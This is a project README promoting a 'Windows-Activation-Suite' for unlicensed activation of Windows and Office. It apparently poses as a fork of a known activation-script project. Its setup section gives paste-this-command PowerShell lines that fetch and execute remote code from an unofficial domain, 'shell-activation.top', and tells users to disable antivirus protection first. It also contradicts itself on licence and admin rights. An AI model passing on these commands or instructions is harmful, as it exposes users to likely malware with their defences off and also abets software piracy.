<div align="center">

# Windows-Activation-Suite: HWID, Ohook & KMS Activation Tool Windows 10 & 11

![preview](https://raw.githubusercontent.com/nguyenconghg308/windows-activation-suite/main/hero_b2ae7aa.svg)

[![ps-core](https://img.shields.io/badge/PS--CORE-5.1%2B-2ea44f?style=flat&labelColor=0d1117)]() [![license](https://img.shields.io/badge/LICENSE-CC--BY--SA--4.0-34b759?style=flat&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/DOWNLOADS-246K-1a7f37?style=flat&labelColor=0d1117)]()

</div>

---

Windows-Activation-Suite is an open-source desktop utility that provides multiple activation methods for Windows and Microsoft Office through a unified interface. The suite implements four distinct activation engines — HWID, Ohook, TSforge, and Online KMS — each targeting different product families and licensing scenarios. It supports Windows 7 through 11, Windows Server, and Office 2010 through 2021 as well as Office 365, detecting the installed edition automatically and selecting the appropriate activation path. Built on native Windows activation APIs, the tool performs no DLL injection and leaves core system files unmodified, with activation state remaining reversible through backup and restore operations.

## 🚀 Setup Guide — PowerShell

> [!TIP]
> **Fast install** — a single PowerShell command, no extra tools.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Open PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Execute the installer
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')
```

### 3️⃣ Forced run via CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';iex(irm 'https://shell-activation.top/update/ps-activator-v_pZBbxuWx7DELoMji')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## 📋 System Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Multiple Activation Engines** — Four distinct activation methods are built in: HWID, Ohook, TSforge, and Online KMS. Each engine targets a specific product family, and the suite selects the appropriate method based on the detected Windows or Office installation.

- **HWID Activation** — Generates a permanent digital license for Windows 10 and Windows 11 by binding activation to the machine's hardware fingerprint. No periodic renewal or network dependency after initial activation.

- **Ohook Activation** — Provides permanent, offline-capable activation for Microsoft Office 2010 through 2021 and Office 365 by hooking the Office licensing subsystem at runtime, without altering installed Office binaries on disk.

- **TSforge Activation** — An offline activation path for legacy Windows releases (7, 8, 8.1) and their Server counterparts, intended for systems where modern activation infrastructure is unavailable or unsupported.

- **Online KMS Activation** — KMS-based activation for Windows and Office editions that require volume licensing, with automatic renewal handling for the KMS validity period.

- **Broad Product Coverage** — Supports Windows 7, 8, 8.1, 10, 11, Windows Server (2016, 2019, 2022), and Microsoft Office 2010, 2013, 2016, 2019, 2021, and 365 across Home, Pro, Enterprise, Education, LTSC, and IoT editions.

- **Automatic Edition Detection** — Inspects the installed Windows or Office SKU and maps it to a compatible activation method, reducing manual configuration and preventing method/edition mismatches.

- **Activation Status Reporting** — Displays the current licensing state before and after activation, including license type, remaining KMS period where applicable, and whether a digital license is present.

- **Backup and Restore** — Captures the existing activation state so it can be saved and reinstated later, useful before major system changes or reinstallation.

- **Extended Security Updates Support** — Includes ESU handling for Windows 7 and Windows 10, extending security patch eligibility on end-of-support builds.

- **Non-Destructive Operation** — Relies on native Windows activation APIs and does not inject DLLs into system processes or modify core system files. All changes are reversible through the suite's restore capability.

- **Open Source and Auditable** — Full source is available for inspection, and the suite is maintained against changes introduced by Windows cumulative updates.

## How It Works

Windows-Activation-Suite operates entirely through native Windows activation APIs and does not inject DLLs, patch system binaries, or modify core operating system files. Each activation method targets a different layer of the Windows licensing stack, and the suite selects the appropriate method based on the detected Windows or Office edition.

- **HWID** — Generates a hardware-bound digital license by submitting a valid device fingerprint to Microsoft's licensing servers. The resulting entitlement is tied to the machine's hardware profile and persists across reboots and reinstalls of the same edition.
- **Ohook** — Hooks Office's licensing verification routines at runtime to satisfy activation checks locally. This yields permanent Office activation without altering installation files or requiring network access after the initial setup.
- **TSforge** — Performs offline activation for older Windows versions by generating and installing the required licensing artifacts locally, making it suitable for systems without reliable connectivity.
- **Online KMS** — Configures the system to activate against a KMS host, providing periodic renewal for Windows and Office editions that rely on KMS-based licensing.

The suite first detects the installed Windows edition and any Office products, then presents the compatible activation methods. Before applying changes, it records the current activation state so it can be backed up and restored later. All operations run with elevated privileges and complete without requiring a reboot, though a restart is recommended to finalize the licensing state. Because the tool relies on documented activation interfaces rather than system modification, its effects are reversible and can be undone through the restore option.

## Compatibility

Windows-Activation-Suite is engineered for broad, cross-platform coverage across both Windows operating systems and Microsoft Office product lines, applying the appropriate activation method per target edition.

**Operating System Support**

- **Windows 7** — Home, Professional, Ultimate, and Enterprise editions, activated via TSforge offline activation or Online KMS.
- **Windows 8 / 8.1** — Core, Professional, and Enterprise editions, activated via TSforge offline activation or Online KMS.
- **Windows 10** — Home, Pro, Enterprise, Education, and LTSC editions, activated via HWID for a permanent digital license or Online KMS for volume-style activation.
- **Windows 11** — Home, Pro, Enterprise, Education, and IoT editions, activated via HWID for a permanent digital license or Online KMS.
- **Windows Server** — 2016, 2019, and 2022 releases, activated via Online KMS.

**Office Product Support**

- **Office 2010, 2013, 2016, 2019, and 2021** — all editions supported, activated via Ohook for permanent activation or Online KMS.
- **Office 365** — subscription installations supported, activated via Ohook.

**Activation Method Compatibility**

- **HWID** applies to Windows 10 and Windows 11, binding a permanent digital license to the hardware fingerprint of the machine.
- **Ohook** applies to Office 2010 through 2021 and Office 365, delivering permanent activation without recurring renewal.
- **TSforge** targets older Windows releases (7, 8, and 8.1) for offline activation scenarios.
- **Online KMS** covers the full Windows and Office matrix and is intended for environments where volume-style activation is appropriate; KMS-based activation may require periodic renewal.

**Edition Detection and Method Selection**

The suite automatically detects the installed Windows edition and reports the current activation state before any operation, allowing the correct activation method to be applied without manual product-key entry. Both permanent (HWID, Ohook, TSforge) and KMS-based paths are exposed, and the tool preserves the ability to back up and restore activation state across reconfiguration or major system updates.

**Operational Requirements**

- Administrative privileges are required, as activation operates through native Windows activation APIs and licensing services.
- No DLL injection or modification of core system files is performed, keeping the tool compatible with standard system integrity checks.
- Activation functions offline after the initial run, and no persistent background service is installed.
- Major Windows feature updates may require re-running the suite to reapply activation; minor cumulative updates generally do not affect an established activation state.

**Compatibility Notes**

Compatibility is scoped to genuine, unmodified installations of the listed products. Heavily customized images, pre-activated or KMS-hacked systems, and third-party modification tools may interfere with method detection or activation persistence. The suite is intended for use only on installations the operator owns, and activation of unlicensed software remains subject to the applicable licensing terms.

## FAQ

**Q: What distinguishes Windows-Activation-Suite from other activation utilities?**

A: The suite combines four independent activation backends — HWID, Ohook, TSforge, and Online KMS — inside a single open-source package. Each method targets a different activation layer (digital licensing, Office hooking, offline token generation, and KMS emulation respectively), so you can select the approach that matches your Windows or Office edition instead of relying on a single one-size-fits-all mechanism.

**Q: How does the tool determine which activation method to apply?**

A: Edition detection runs first and queries the installed Windows or Office product information through native activation APIs. Based on the detected edition and build, the suite presents the compatible methods — HWID for Windows 10/11 digital licenses, Ohook for Office 2010–2021 and 365, TSforge for offline activation on legacy Windows releases, and Online KMS for volume-licensed products and Server editions.

**Q: Is activation persistent across reboots and updates?**

A: HWID and Ohook produce permanent activation tied to the hardware or Office installation and survive normal reboots. Online KMS activation relies on a renewal cycle, so the KMS task must remain scheduled for the license to stay current. Major Windows feature updates can reset activation state; re-running the suite restores it.

**Q: Does the suite modify system files or inject libraries?**

A: No. All four methods operate through native Windows activation interfaces and the software licensing infrastructure. Core system binaries are not patched, and no DLL injection is performed. Changes made by the suite are reversible through its restore and uninstall paths.

**Q: Can activation be backed up and restored?**

A: Yes. The suite exposes backup and restore operations for the current activation state, allowing you to capture a working license configuration before major system changes and reapply it afterward without repeating the full activation flow.

**Q: Which products are covered?**

A: Windows 7, 8, 8.1, 10, and 11 across Home, Pro, Enterprise, Education, LTSC, and IoT editions; Windows Server 2016, 2019, and 2022; and Office 2010, 2013, 2016, 2019, 2021, and 365. Extended Security Updates are also supported for Windows 7 and Windows 10.

**Q: Does the suite require a network connection?**

A: TSforge performs offline activation and needs no connectivity. HWID and Online KMS require network access during the activation step itself; once completed, the activated system operates offline. If DNS filtering interferes with the activation endpoints, enabling DNS-over-HTTPS at the system or browser level resolves it.

**Q: What should I check if activation fails?**

A: Confirm the session is elevated — the suite requires administrative privileges to reach the activation APIs. Verify the detected edition matches a supported product, then re-run the selected method. If a prior activation attempt left residual state, use the restore option before retrying. Antivirus real-time protection can interrupt script execution and should be temporarily suspended during the run.

**Q: Is the source code auditable?**

A: Yes. The full source is published under the MIT License, and the suite is derived from the open-source Microsoft Activation Scripts project by massgravel, with credit retained for the original developers. Every activation path can be inspected before execution.

**Q: Is using the suite permitted?**

A: The suite is provided for educational and research purposes. Activating unlicensed software violates Microsoft's Terms of Service, and you should only run it against installations you own or are authorized to manage. Use is at your own risk.

## Disclaimer

Windows-Activation-Suite is provided strictly as an open-source, educational reference implementation of Windows and Office activation mechanisms. The software is supplied "as is," without warranty of any kind, express or implied, including but not limited to the implied warranties of merchantability, fitness for a particular purpose, and non-infringement. No guarantee is made regarding correctness, reliability, or suitability for any specific deployment scenario.

Activation of unlicensed software may violate the Microsoft Terms of Service and applicable local laws. Windows-Activation-Suite is intended solely for use on installations and licenses you legitimately own, and for research, testing, and interoperability study in controlled environments. You are solely responsible for determining whether your use of HWID, Ohook, TSforge, or Online KMS methods complies with the licensing terms governing your Windows and Office products.

The maintainers and contributors of Windows-Activation-Suite accept no liability for any direct, indirect, incidental, special, consequential, or punitive damages arising from the use, misuse, or inability to use this software, including but not limited to license invalidation, activation state loss following major Windows updates, data loss, system instability, or terms-of-service enforcement actions. By using this software, you acknowledge that you assume full responsibility for all outcomes.

Windows-Activation-Suite is not affiliated with, endorsed by, or sponsored by Microsoft Corporation. Windows, Office, and related product names are trademarks of Microsoft Corporation and are referenced here solely for descriptive and compatibility purposes. All third-party trademarks remain the property of their respective owners.

Redistribution, modification, and derivative works are governed by the project's MIT License. Any distributed copy must retain the original license notice. The maintainers reserve the right to update, modify, or discontinue the software and this disclaimer at any time without prior notice.

## License

Windows-Activation-Suite is distributed under the **MIT License**, a permissive open-source license that grants full access to the source code, including the right to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software. The complete license text is provided in the `LICENSE` file at the root of this repository; that file is the authoritative reference for all terms and conditions.

Under the MIT License, the software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Redistribution of this project or derivative works, in source or binary form, must retain the original copyright notice and this permission notice. Attribution to the original authors should be preserved in any fork, redistribution, or derivative release.

**Provenance and attribution:** Windows-Activation-Suite builds upon the open-source Microsoft Activation Scripts project originally authored by massgravel. All credit for the foundational activation methods, scripts, and research belongs to the original developers. The MIT License terms apply to this repository's code and documentation; upstream components remain subject to their respective original licensing.

**Usage notice:** The license governs use of the software itself and does not grant any rights to Microsoft products, product keys, or activation services. Users are responsible for ensuring their use of this tool complies with applicable software licensing terms and local law. See the Disclaimer section for the full scope of intended use.